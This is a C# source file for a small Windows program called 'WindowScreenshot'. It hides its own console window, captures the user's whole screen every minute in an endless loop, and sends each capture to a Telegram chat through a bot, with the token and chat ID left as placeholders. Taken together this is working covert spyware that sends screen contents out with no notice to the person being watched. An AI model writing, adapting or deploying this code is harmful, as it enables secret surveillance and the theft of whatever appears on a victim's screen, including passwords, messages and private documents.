using System.Drawing.Imaging;
using System.Drawing;
using Telegram.Bot;
using Telegram.Bot.Types.InputFiles;
using WindowScreenshot.Console;
using System.Runtime.InteropServices;
using System.IO;
using System.Threading.Tasks;
using System.Threading;
using System;


namespace WindowScreenshot
{
    internal class Program
    {
        private static ITelegramBotClient _botClient;

        [DllImport("kernel32.dll")]
        private static extern bool AllocConsole();

        [DllImport("kernel32.dll")]
        private static extern bool FreeConsole();

        static async Task Main(string[] args)
        {
            FreeConsole();

            _botClient = new TelegramBotClient("Your_Telegram_bot_Token");

            _botClient.StartReceiving();

            ScreenshotService service = new ScreenshotService();

            Rectangle screenBounds = service.GetPrimaryScreenBounds();

            while (true)
            {
                using var ms = new MemoryStream();

                using Bitmap screenshot = new(screenBounds.Width, screenBounds.Height);

                using var graphics = Graphics.FromImage(screenshot);

                graphics.CopyFromScreen(screenBounds.Location, Point.Empty, screenBounds.Size);

                screenshot.Save(ms, ImageFormat.Png);

                byte[] imageBytes = ms.ToArray();

                InputOnlineFile photo = new InputOnlineFile(new MemoryStream(imageBytes), "screnshoot.jpg");

                await _botClient.SendPhotoAsync("your_chat_id", photo);

                Thread.Sleep(60000);

                GC.Collect();
            }
        }
    }
}
